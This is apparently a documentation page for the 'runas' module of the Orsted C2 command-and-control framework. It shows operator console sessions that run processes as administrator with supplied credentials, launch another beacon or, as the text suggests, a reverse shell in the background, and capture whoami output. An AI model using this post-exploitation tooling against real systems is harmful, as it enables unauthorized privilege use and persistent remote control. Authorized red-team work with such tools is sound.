---

title: runas
descripton: orsted c2 runas
---

### General

`runas` allows you to run processes as another user.

```
[Session 9: haroun@DESKTOP-DU89UIV] » runas --help

RunAs a process in go

Usage:
  runas [flags] username password [app...]

Args:
  username  string         Username ex. rudeus, CORP\rudeus
  password  string         Password of username
  app       string list    Application to run with its arguments

Flags:
  -h, --help              display help
  -b, --no-background     Specify to not run process in background and capture output
```

It requires you to load the `runas` dll with `load-module runas`


### Usage

By default `runas` will run whatever you give it in the background without returning any output. 

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » runas administrator administrator Z:\main_http.exe
```
This is useful when you want to run another `orsted-beacon` or a reverse shell without blocking the `orsted-beacon`.

The output will be something like:

```
[Session 9: haroun@DESKTOP-DU89UIV] » runas administrator administrator Z:\main_http.exe
+--------+-----------+---------+--------------------------------+
| TASKID | SESSIONID |  STATE  |            COMMAND             |
+--------+-----------+---------+--------------------------------+
|     90 |         9 | pending | runas background administrator |
|        |           |         | administrator Z:main_http.exe  |
+--------+-----------+---------+--------------------------------+
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> runas --background administrator administrator Z:main_http.exe
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> runas --background administrator administrator Z:main_http.exe
 <<< Runned what you want in background, no output will be printed

Beacon From 192.168.122.76 - DESKTOP-DU89UIV - DESKTOP-DU89UIV\Administrator - windows
```

### Usage with `--no-background`

Sometimes, you need to capture the output of the command. This is when the flag `--no-background` can be useful.

```powershell
[Session 9: haroun@DESKTOP-DU89UIV] » runas --no-background  administrator administrator whoami
```

The result will be something like

```
[Session 9: haroun@DESKTOP-DU89UIV] » runas --no-background  administrator administrator whoami
+--------+-----------+---------+--------------------------------+
| TASKID | SESSIONID |  STATE  |            COMMAND             |
+--------+-----------+---------+--------------------------------+
|     92 |         9 | pending | runas no-background            |
|        |           |         | administrator administrator    |
|        |           |         | whoami                         |
+--------+-----------+---------+--------------------------------+
[Session 9: haroun@DESKTOP-DU89UIV] »
 >>> runas --no-background administrator administrator whoami
 <<<
STDOUT --->
Task Register Successufully
STDERR --->


 >>> runas --no-background administrator administrator whoami
 <<< Created C:\Windows\system32\whoami.exe whoami  process with an ID of 1564
desktop-du89uiv\administrator
```
